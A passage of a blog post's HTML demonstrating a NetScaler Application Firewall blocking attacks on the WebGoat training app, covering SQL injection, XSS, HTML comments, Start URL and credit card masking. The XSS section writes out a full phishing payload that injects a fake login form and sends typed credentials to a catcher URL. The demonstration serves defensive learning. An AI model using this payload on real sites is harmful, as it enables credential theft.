+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/SQLInject.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1004 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/SQLInject-300x230.png" alt="SQLInject" width="300" height="230" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/SQLInject-300x230.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/SQLInject-768x590.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/SQLInject-1024x787.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/SQLInject.png 1208w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>*Note: the above credit card numbers are not real &#8211; more on that later.</p>
+<p>Now, restart the lesson, <strong>enable App Firewall</strong> on the NetScaler and try again. Web Goat will not receive any response and thus not display any results. <strong>You have successfully blocked a SQL Injection attack using NetScaler Application Firewall!</strong></p>
+<p>To verify that NetScaler is doing its job, go to System &gt; Auditing then choose <strong>Syslog Messages</strong> and Filter By &gt; Module &gt; AppFW</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Audit.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1007 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Audit-300x62.png" alt="Audit" width="300" height="62" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Audit-300x62.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Audit-768x158.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Audit-1024x211.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Audit.png 1369w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Ad-Three -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:468px;height:60px"
+     data-ad-client="ca-pub-4231537285270058"
+     data-ad-slot="8609315823"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<h3>Demo 2: Cross Site Scripting (XSS)</h3>
+<p>Disable AppFW, then proceed to Web Goat &#8211; <strong>Cross-Site Scripting (XSS) &gt; Phishing with XSS</strong>. In the search field, enter the following (this can be copied from the solution):</p>
+<pre>&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user="+ document.phish.user.value + "&amp;password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} &lt;/script&gt;&lt;form name="phish"&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3 &gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type="text" name="user"&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type="password" name = "pass"&gt;&lt;br&gt;&lt;input type="submit" name="login" value="login" onclick="hack()"&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;</pre>
+<p>If successful, clicking the Search button will create a logon form below the search box, convincing the unsuspecting user to enter his\her credentials.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/XSS.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1006 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/XSS-300x238.png" alt="XSS" width="300" height="238" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/XSS-300x238.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/XSS-768x610.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/XSS-1024x813.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/XSS.png 1129w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>Next, enable Application Firewall and try again &#8211; the cross site script will be blocked.</p>
+<h3>Demo 3: HTML Comments</h3>
+<p>Sometimes comments are left in HTML code that can help an attacker discover information about your web application. In Web Goat, go to <strong>Code Quality &gt; Discover Clues in the HTML</strong>. At the login page, view the page source and look for HTML comments (this scenario is highly unlikely, but shows off the NetScaler rewrite engine)</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Source1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1008 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Source1-300x199.png" alt="Source1" width="300" height="199" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Source1-300x199.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Source1-768x510.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Source1.png 835w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>Here you can see that the admin left his\her credentials in the HTML comments! admin\adminpw. Turn on AppFirewall to strip them out.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Source2.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1009 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Source2-300x188.png" alt="Source2" width="300" height="188" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Source2-300x188.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Source2-768x481.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Source2.png 821w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<h3>Demo 4: Start URL</h3>
+<p>The idea behind the Start URL is that the App Firewall can create a path of pages based on links and forms in the code &#8211; if you arrive at (or try to get to) a page without following this path, you will be blocked. This can be very tricky to demo, so be sure to play with all of the settings and rule sets.</p>
+<p>We need to turn on <strong>Start URL blocking in the AppFW Profile</strong> &#8211; to do this go to Security &gt; Application Firewall &gt; Profiles &#8211; select the active profile, then choose <strong>Edit </strong>&#8211; Security Checks. Set the <strong>Start URL to Block</strong> then OK. Turn on App Firewall and try to browse to Web Goat &#8211; you should be blocked (go nowhere). If you have a redirect URL in the Profile Settings, you will be redirected (the screen shot shows a simple redirect page).</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Redirect.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1010 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Redirect-300x74.png" alt="Redirect" width="300" height="74" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Redirect-300x74.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Redirect-768x189.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Redirect-1024x251.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Redirect.png 1271w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>To allow this to work, we need to add all of the learned rules to the profile. To do this, go back to the <strong>AppFW Profile</strong> and select Learned Rules &gt; Start URL &gt; Start URL &gt; Edit. Here you will see all of the potential URLs that need to be added as rules. Select all of them and choose <strong>Deploy</strong>.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Rules.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1011 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Rules-300x200.png" alt="Rules" width="300" height="200" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Rules-300x200.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Rules-768x511.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Rules-1024x682.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Rules.png 1116w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>Now, when you browse to Web Goat, you will return to the login screen as expected. <em>*Note: newer versions of WebGoat use dynamic pages so the Start URL functionality may not work 100% as expected by default.</em></p>
+<h3>Demo 5: Credit Card Data Loss Prevention</h3>
+<p>There is not a demo in Web Goat for this functionality &#8211; if you want to see it for yourself, you will need to configure a basic web site and use actual credit card numbers. The numbers used by Web Goat are not legitimate card numbers &#8211; real card numbers are generated using an algorithm &#8211; and the AppFW knows that algorithm. To see the options for credit cards, go to the <strong>App Firewall profile</strong> <strong>&gt; Security Checks &gt; Credit Card &gt; Action Settings. </strong>From here, you can select which cards will be protected as well as if they will be X&#8217;d out or blocked all together.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/CC.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1012 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/CC-300x130.png" alt="CC" width="300" height="130" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/CC-300x130.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/CC-768x333.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/CC-1024x444.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/CC.png 1048w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>So rather than block pages with credit cards all together, I&#8217;ll show you what happens when we use the &#8216;X-Out&#8217; method. For this demo, I&#8217;m using a simple .htm file that includes <em>real</em> credit card numbers &#8211; here&#8217;s the source file:</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1014 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo-300x166.png" alt="CCDemo" width="300" height="166" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo-300x166.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo.png 762w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>With App Firewall turned on, we can browse to the page and see the result when real credit card numbers are detected on the page:</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo2.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1015 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo2-300x239.png" alt="CCDemo2" width="300" height="239" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo2-300x239.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/CCDemo2.png 411w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<h3>Conclusion</h3>
+<p>NetScaler Application Firewall is a powerful security tool that can help protect your enterprise against threats to your public facing web application. It is available both as a stand-alone appliance or integrated with a Platinum edition NetScaler ADC. More information is available from these links:</p>
+<p><a href="https://www.citrix.com/products/netscaler-appfirewall/overview.html" target="_blank" rel="noopener">https://www.citrix.com/products/netscaler-appfirewall/overview.html</a></p>
+<p><a href="https://www.citrix.com/products/netscaler-appfirewall/tech-info.html" target="_blank" rel="noopener">https://www.citrix.com/products/netscaler-appfirewall/tech-info.html</a></p>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Ad-Three -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:468px;height:60px"
+     data-ad-client="ca-pub-4231537285270058"
+     data-ad-slot="8609315823"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+		</div>
+
+				<footer class="entry-meta" aria-label="Entry meta">
+			<span class="cat-links"><span class="screen-reader-text">Categories </span><a href="https://blogs.serioustek.net/category/appfirewall" rel="category tag">AppFirewall</a>, <a href="https://blogs.serioustek.net/category/citrix" rel="category tag">Citrix</a>, <a href="https://blogs.serioustek.net/category/netscaler" rel="category tag">NetScaler</a></span> <span class="tags-links"><span class="screen-reader-text">Tags </span><a href="https://blogs.serioustek.net/post/tag/appfirewall" rel="tag">AppFirewall</a>, <a href="https://blogs.serioustek.net/post/tag/application-firewall" rel="tag">Application Firewall</a>, <a href="https://blogs.serioustek.net/post/tag/citrix" rel="tag">Citrix</a>, <a href="https://blogs.serioustek.net/post/tag/netscaler" rel="tag">NetScaler</a></span> 		<nav id="nav-below" class="post-navigation" aria-label="Posts">
+			<div class="nav-previous"><span class="prev"><a href="https://blogs.serioustek.net/post/2016/02/24/upm-configuration-check" rel="prev">Citrix Supportability Pack &#8211; UPM Configuration Check</a></span></div><div class="nav-next"><span class="next"><a href="https://blogs.serioustek.net/post/2016/04/04/upgrades-lab-local-ssd-hypervisors" rel="next">Upgrades to the Lab: Local SSD and Hypervisors</a></span></div>		</nav>
+				</footer>
+			</div>
+</article>
+
+			<div class="comments-area">
+				<div id="comments">
+
+	
+		<div id="respond" class="comment-respond">
+			<h3 id="reply-title" class="comment-reply-title">Leave a Reply<small><a rel="nofollow" id="cancel-comment-reply-link" href="/post/2016/03/22/demo-netscaler-app-firewall#respond" style="display:none;">Cancel reply</a></small></h3>			<form id="commentform" class="comment-form">
+				<iframe
+					title="Comment Form"
+					src="https://jetpack.wordpress.com/jetpack-comment/?blogid=94542450&#038;postid=990&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=1&#038;stb_enabled=1&#038;show_avatars=1&#038;avatar_default=mystery&#038;greeting=Leave+a+Reply&#038;jetpack_comments_nonce=d0d9245692&#038;greeting_reply=Leave+a+Reply+to+%25s&#038;color_scheme=dark&#038;lang=en_US&#038;jetpack_version=14.5&#038;iframe_unique_id=1&#038;show_cookie_consent=10&#038;has_cookie_consent=0&#038;is_current_user_subscribed=0&#038;token_key=%3Bnormal%3B&#038;sig=35a2c295c7d35daf9f4c3baeb01c43c2f5a6eb9e#parent=https%3A%2F%2Fblogs.serioustek.net%2Fpost%2F2016%2F03%2F22%2Fdemo-netscaler-app-firewall"
+											name="jetpack_remote_comment"
+						style="width:100%; height: 430px; border:0;"
+										class="jetpack_remote_comment"
+					id="jetpack_remote_comment"
+					sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups"
+				>
+									</iframe>
+									<!--[if !IE]><!-->
+					<script>
+						document.addEventListener('DOMContentLoaded', function () {
+							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
+							for (var i = 0; i < commentForms.length; i++) {
+								commentForms[i].allowTransparency = false;
+								commentForms[i].scrolling = 'no';
+							}
+						});
+					</script>
+					<!--<![endif]-->
+							</form>
+		</div>
+
+		
+		<input type="hidden" name="comment_parent" id="comment_parent" value="" />
+
+		<p class="akismet_comment_form_privacy_notice">This site uses Akismet to reduce spam. <a href="https://akismet.com/privacy/" target="_blank" rel="nofollow noopener">Learn how your comment data is processed.</a></p>
+</div><!-- #comments -->
+			</div>
+
+					</main>
+	</div>
+
+	<div class="widget-area sidebar is-left-sidebar grid-15 tablet-grid-15 mobile-grid-100 grid-parent pull-60 tablet-pull-60" id="left-sidebar">
+	<div class="inside-left-sidebar">
+		<aside id="search-3" class="widget inner-padding widget_search"><form method="get" class="search-form" action="https://blogs.serioustek.net/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:">
+	</label>
+	<input type="submit" class="search-submit" value="Search"></form>
+</aside><aside id="categories-2" class="widget inner-padding widget_categories"><h2 class="widget-title">Categories</h2><form action="https://blogs.serioustek.net" method="get"><label class="screen-reader-text" for="cat">Categories</label><select  name='cat' id='cat' class='postform'>
+	<option value='-1'>Select Category</option>
+	<option class="level-0" value="108">AppDisk</option>
+	<option class="level-0" value="122">AppFirewall</option>
+	<option class="level-0" value="171">Authentication</option>
+	<option class="level-0" value="189">Automotive</option>
+	<option class="level-0" value="169">BitLocker</option>
+	<option class="level-0" value="2">Citrix</option>
+	<option class="level-0" value="175">Citrix ADC</option>
+	<option class="level-0" value="115">CloudBridge</option>
+	<option class="level-0" value="172">CTA</option>
+	<option class="level-0" value="114">Datacenter</option>
+	<option class="level-0" value="3">Deployment</option>
+	<option class="level-0" value="107">EUEM</option>
+	<option class="level-0" value="4">Fine Tuning Media Center 7</option>
+	<option class="level-0" value="112">FreeNAS</option>
+	<option class="level-0" value="5">General</option>
+	<option class="level-0" value="103">HDHomeRun</option>
+	<option class="level-0" value="6">Home Automation</option>
+	<option class="level-0" value="7">Home Lab</option>
+	<option class="level-0" value="165">Hosting</option>
+	<option class="level-0" value="118">ISP</option>
+	<option class="level-0" value="105">Kodi</option>
+	<option class="level-0" value="179">KVM</option>
+	<option class="level-0" value="102">MDT</option>
+	<option class="level-0" value="100">Monitoring</option>
+	<option class="level-0" value="184">NCSAM</option>
+	<option class="level-0" value="110">NetApp</option>
+	<option class="level-0" value="111">NetScaler</option>
+	<option class="level-0" value="119">Networking</option>
+	<option class="level-0" value="101">Nutanix CE</option>
+	<option class="level-0" value="99">PowerShell</option>
+	<option class="level-0" value="178">Proxmox</option>
+	<option class="level-0" value="117">Rant</option>
+	<option class="level-0" value="174">RDS</option>
+	<option class="level-0" value="170">SAML</option>
+	<option class="level-0" value="116">SDWAN</option>
+	<option class="level-0" value="185">Security</option>
+	<option class="level-0" value="109">ShareFile</option>
+	<option class="level-0" value="8">Software Based Storage</option>
+	<option class="level-0" value="173">Sophos XG</option>
+	<option class="level-0" value="113">Storage</option>
+	<option class="level-0" value="106">Storefront</option>
+	<option class="level-0" value="120">SupportabilityPack</option>
+	<option class="level-0" value="187">Synology</option>
+	<option class="level-0" value="1">Uncategorized</option>
+	<option class="level-0" value="121">UserProfileManager</option>
+	<option class="level-0" value="9">VMware</option>
+	<option class="level-0" value="168">Windows 10</option>
+	<option class="level-0" value="11">Windows Malware</option>
+	<option class="level-0" value="104">WindowsMediaCenter</option>
+	<option class="level-0" value="164">WordPress</option>
+	<option class="level-0" value="123">XenServer</option>
+</select>
+</form><script>
+(function() {
+	var dropdown = document.getElementById( "cat" );
+	function onCatChange() {
+		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
+			dropdown.parentNode.submit();
+		}
+	}
+	dropdown.onchange = onCatChange;
+})();
+</script>
+</aside><aside id="archives-3" class="widget inner-padding widget_archive"><h2 class="widget-title">Archives</h2>
+			<ul>
+					<li><a href='https://blogs.serioustek.net/post/2022/01'>January 2022</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2020/05'>May 2020</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2020/03'>March 2020</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2019/10'>October 2019</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2019/09'>September 2019</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2019/07'>July 2019</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2019/05'>May 2019</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2019/03'>March 2019</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2018/10'>October 2018</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2018/04'>April 2018</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2017/11'>November 2017</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2017/09'>September 2017</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2017/06'>June 2017</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2017/03'>March 2017</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/11'>November 2016</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/09'>September 2016</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/08'>August 2016</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/07'>July 2016</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/05'>May 2016</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/04'>April 2016</a>&nbsp;(4)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/03'>March 2016</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/02'>February 2016</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2016/01'>January 2016</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/12'>December 2015</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/11'>November 2015</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/10'>October 2015</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/09'>September 2015</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/08'>August 2015</a>&nbsp;(5)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/07'>July 2015</a>&nbsp;(5)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/06'>June 2015</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/05'>May 2015</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/04'>April 2015</a>&nbsp;(8)</li>
+	<li><a href='https://blogs.serioustek.net/post/2015/01'>January 2015</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2014/12'>December 2014</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2014/10'>October 2014</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2014/09'>September 2014</a>&nbsp;(6)</li>
+	<li><a href='https://blogs.serioustek.net/post/2014/08'>August 2014</a>&nbsp;(5)</li>
+	<li><a href='https://blogs.serioustek.net/post/2014/07'>July 2014</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2014/06'>June 2014</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2014/01'>January 2014</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/09'>September 2013</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/08'>August 2013</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/07'>July 2013</a>&nbsp;(4)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/06'>June 2013</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/04'>April 2013</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/03'>March 2013</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/02'>February 2013</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2013/01'>January 2013</a>&nbsp;(4)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/10'>October 2012</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/09'>September 2012</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/08'>August 2012</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/07'>July 2012</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/06'>June 2012</a>&nbsp;(4)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/05'>May 2012</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/04'>April 2012</a>&nbsp;(4)</li>
+	<li><a href='https://blogs.serioustek.net/post/2012/03'>March 2012</a>&nbsp;(7)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/09'>September 2011</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/08'>August 2011</a>&nbsp;(6)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/07'>July 2011</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/06'>June 2011</a>&nbsp;(2)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/05'>May 2011</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/04'>April 2011</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/02'>February 2011</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2011/01'>January 2011</a>&nbsp;(4)</li>
+	<li><a href='https://blogs.serioustek.net/post/2010/12'>December 2010</a>&nbsp;(6)</li>
+	<li><a href='https://blogs.serioustek.net/post/2010/11'>November 2010</a>&nbsp;(3)</li>
+	<li><a href='https://blogs.serioustek.net/post/2010/10'>October 2010</a>&nbsp;(1)</li>
+	<li><a href='https://blogs.serioustek.net/post/2010/09'>September 2010</a>&nbsp;(9)</li>
+			</ul>
+
+			</aside>	</div>
+</div>
+<div class="widget-area sidebar is-right-sidebar grid-25 tablet-grid-25 grid-parent" id="right-sidebar">
+	<div class="inside-right-sidebar">
+		<aside id="text-3" class="widget inner-padding widget_text"><h2 class="widget-title">About the Author</h2>			<div class="textwidget"><img src="/wp-content/uploads/2015/Headshot.PNG" alt="Profile" style="float:left; border-radius: 20px; width: 103px; height: 105px; padding: 10px;" alt="Jake Rutski"/><p style="font-size:100%">
+Jacob 'Jake' Rutski works for <a href="https://www.tanium.com/">Tanium</a> on the Technical Marketing team, focused on Networking, AppSec, and ZTNA. Expect drabble on all things tech, automation, and storage. <i>The content in this blog represent individual views, not those of Tanium</i></p></div>
+		</aside><aside id="text-2" class="widget inner-padding widget_text"><h2 class="widget-title">Citrix User Group</h2>			<div class="textwidget"><p><a href="http://www.mycugc.org" target="_blank"><img src="/wp-content/uploads/2015/06/cugc-orange.png" style="border-radius: 10px;" alt="Citrix User Group Community" /></a></p></div>
+		</aside><aside id="block-3" class="widget inner-padding widget_block">
+<h2 class="wp-block-heading">Support This Site</h2>
+</aside><aside id="block-2" class="widget inner-padding widget_block"><p><b>Lab Gear For Sale</b></p>
+<p><a href="https://www.ebay.com/itm/187182130748" target="_blank"><img decoding="async" src="/wp-content/uploads/2025/04/monitor.png" style="border-radius: 5px;" alt="Lab Gear"></a></p>
+<p>Dell UltraSharp U2415</p></br></aside>
+		<aside id="recent-posts-2" class="widget inner-padding widget_recent_entries">
+		<h2 class="widget-title">Recent Posts</h2>
+		<ul>
+											<li>
+					<a href="https://blogs.serioustek.net/post/2022/01/28/trading-our-odyssey-for-a-volvo-xc90-the-best-phev-suv-we-love-it">Trading our Odyssey for a Volvo XC90: the Best PHEV SUV (We Love it!)</a>
+									</li>
+											<li>
+					<a href="https://blogs.serioustek.net/post/2020/05/29/configure-one-identity-starling-with-netscaler">Configure One Identity Starling with NetScaler</a>
+									</li>
+											<li>
+					<a href="https://blogs.serioustek.net/post/2020/05/07/synology-active-backup-and-mdt">Synology Active Backup and MDT</a>
+									</li>
+											<li>
+					<a href="https://blogs.serioustek.net/post/2020/03/24/why-i-switched-to-synology">Why I Switched to Synology</a>
+									</li>
+											<li>
+					<a href="https://blogs.serioustek.net/post/2019/10/29/ncsam-post-0011-mfa-all-the-things">NCSAM &#8211; Post 0011: MFA ALL THE THINGS</a>
+									</li>
+					</ul>
+
+		</aside>	</div>
+</div>
+
+	</div>
+</div>
+
+
+<div class="site-footer">
+				<div id="footer-widgets" class="site footer-widgets">
+				<div class="footer-widgets-container grid-container grid-parent">
+					<div class="inside-footer-widgets">
+							<div class="footer-widget-1 grid-parent grid-33 tablet-grid-50 mobile-grid-100">
+		<aside id="text-6" class="widget inner-padding widget_text"><h2 class="widget-title">Advertise Here</h2>			<div class="textwidget"><p><a href="https://m.do.co/c/a5d5552767ed" target="_blank"><img src="/wp-content/uploads/2016/06/DigitalOceanPromo.png" style="border-radius: 5px;" alt="Digital Ocean" /></a></p></div>
+		</aside>	</div>
+		<div class="footer-widget-2 grid-parent grid-33 tablet-grid-50 mobile-grid-100">
+		<aside id="text-5" class="widget inner-padding widget_text">			<div class="textwidget"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Rectange-bottom -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:400px;height:300px"
+     data-ad-client="ca-pub-4231537285270058"
+     data-ad-slot="5406563251"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+		</aside>	</div>
+		<div class="footer-widget-3 grid-parent grid-33 tablet-grid-50 mobile-grid-100">
+		<aside id="meta-3" class="widget inner-padding widget_meta"><h2 class="widget-title">Meta</h2>
+		<ul>
+						<li><a href="https://blogs.serioustek.net/wp-login.php">Log in</a></li>
+			<li><a href="https://blogs.serioustek.net/feed">Entries feed</a></li>
+			<li><a href="https://blogs.serioustek.net/comments/feed">Comments feed</a></li>
+
+			<li><a href="https://wordpress.org/">WordPress.org</a></li>
+		</ul>
+
+		</aside>	</div>
+						</div>
+				</div>
+			</div>
+					<footer class="site-info" aria-label="Site"  itemtype="https://schema.org/WPFooter" itemscope>
+			<div class="inside-site-info grid-container grid-parent">
+								<div class="copyright-bar">
+					&copy; 2025 Jacob Rutski - SeriousTek | <a href="/cdn-cgi/l/email-protection#b3d9d2d8d6f3c0d6c1dadcc6c0c7d6d89dddd6c7" target="_top">Contact me</a>				</div>
+			</div>
+		</footer>
+		</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script id="generate-a11y">!function(){"use strict";if("querySelector"in document&&"addEventListener"in window){var e=document.body;e.addEventListener("mousedown",function(){e.classList.add("using-mouse")}),e.addEventListener("keydown",function(){e.classList.remove("using-mouse")})}}();</script><link rel='stylesheet' id='lsi-style-css' href='https://blogs.serioustek.net/wp-content/plugins/lightweight-social-icons/css/style-min.css?ver=1.1' media='all' />
+<style id='lsi-style-inline-css'>
+.icon-set-lsi_widget-3 a,
+			.icon-set-lsi_widget-3 a:visited,
+			.icon-set-lsi_widget-3 a:focus {
+				border-radius: 2px;
